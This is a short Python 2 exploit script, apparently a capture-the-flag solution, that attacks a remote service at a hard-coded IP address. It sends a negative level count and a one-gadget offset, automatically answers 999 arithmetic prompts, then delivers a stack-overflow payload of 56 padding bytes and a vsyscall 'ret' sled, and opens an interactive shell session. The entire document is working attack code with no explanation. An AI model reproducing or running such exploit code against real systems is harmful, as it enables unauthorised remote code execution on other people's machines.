#!/usr/bin/python
# Author : peternguyen

from Pwn import *
import re

p = Pwn(host='47.74.147.103',port=20001,mode=1)
# p = Pwn(mode=1)

def exploit(**kargs):
	global p # use global var
	if kargs.has_key('p'):
		if kargs['p'].__class__.__name__ == 'Pwn': # is pwn object
			p = kargs['p']
	p.connect()

	# make system in stack 
	p.read_until('Choice:')
	p.sendint(2)	

	p.read_until('Choice:')
	p.sendint(1)
	print p.read_until('How many levels?')
	p.sendline('-1')
	print p.read_until('Any more?')

	p.sendline('700132')# one gadget offset

	# # lets play the game
	for i in xrange(999):
		out = p.read_until('Answer:')
		print out
		l,r = re.findall(r'Question: (\d+) \* (\d+) = \?',out)[0]
		l = int(l); r = int(r)
		p.sendint(l * r)

	# raw_input('Debug>')
	out = p.read_until('Answer:')
	print out
	payload = 'A'*56
	payload+= p.pack(0xffffffffff600800)*3 # ret
	p.send(payload)


	p.io()

exploit()